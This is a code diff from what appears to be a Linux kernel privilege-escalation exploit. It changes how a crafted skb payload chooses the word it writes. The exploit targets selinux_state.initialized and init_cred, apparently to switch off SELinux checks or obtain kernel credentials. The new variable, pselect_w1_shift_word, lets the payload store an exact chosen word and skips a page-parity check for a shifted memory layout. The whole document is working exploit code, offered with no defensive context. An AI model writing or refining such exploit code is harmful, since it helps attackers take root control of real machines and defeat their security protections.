@@ -40,6 +40,12 @@ int pselect_custom_write;
 uintptr_t pselect_custom_target;
 int pselect_child_node;  /* Preserve initialized bytes when set. */
 
+/* W1 (-4 shift) exact word: when nonzero, prepare_skb_payload() stores this
+ * 64-bit word verbatim instead of the page-derived address, and the "byte 2
+ * must be odd" page rule is skipped -- that rule only exists for the unshifted
+ * +0 layout, where the word's byte 2 lands on selinux_state.initialized. */
+uintptr_t pselect_w1_shift_word;
+
 void set_pselect_write_mode(uintptr_t target, int mode) {
   pselect_custom_target = target;
   pselect_custom_write = mode;
@@ -410,8 +416,10 @@ int prepare_skb_payload(uintptr_t base) {
         /* W2 uses init_cred; resolve it from the selected device entry. */
         fake_right = data_addr(g_init_cred_image);
       } else {
-        /* W1 targets the initialized page at base+0x100. */
-        fake_right = base + 0x100;
+        /* W1 targets the initialized page at base+0x100, unless the shifted
+         * (-4) layout armed an exact word. */
+        fake_right = pselect_w1_shift_word ? pselect_w1_shift_word
+                                           : (base + 0x100);
       }
     } else {
       fake_right = 0;  /* leaf: write 0 */
@@ -748,7 +756,7 @@ uintptr_t prepare_good_kernel_page(void) {
       /* W1 stores this page address, so the word's byte 2 lands on
        * selinux_state.initialized. an even byte there fails every SID lookup */
       if (pselect_custom_write == 1 && pselect_child_node &&
-          ((fake_right >> 16) & 1) == 0) {
+          !pselect_w1_shift_word && ((fake_right >> 16) & 1) == 0) {
         pr_warning("page %016zx stores an even byte over "
                    "selinux_state.initialized; taking another\n", (size_t)base);
       } else {
